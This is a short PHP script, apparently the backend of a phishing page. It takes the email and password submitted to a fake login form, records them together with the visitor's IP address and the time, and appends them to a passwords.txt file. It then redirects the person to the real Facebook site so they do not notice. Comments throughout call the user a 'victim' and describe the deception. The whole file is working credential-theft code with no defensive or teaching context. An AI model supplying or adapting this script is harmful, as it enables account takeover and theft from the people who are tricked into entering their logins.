<?php
// 1. Capture the data from the POST request
$email = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; // Capture the victim's IP address
$time = date('Y-m-d H:i:s');

// 2. Format the data for our log file
$log_entry = "Time: $time | IP: $ip | Email: $email | Pass: $password" . PHP_EOL;

// 3. Save to a local file (FILE_APPEND keeps old data)
file_put_contents("passwords.txt", $log_entry, FILE_APPEND);

// 4. Redirect the user to the REAL website so they don't get suspicious
header("Location: https://www.facebook.com");
exit();
?>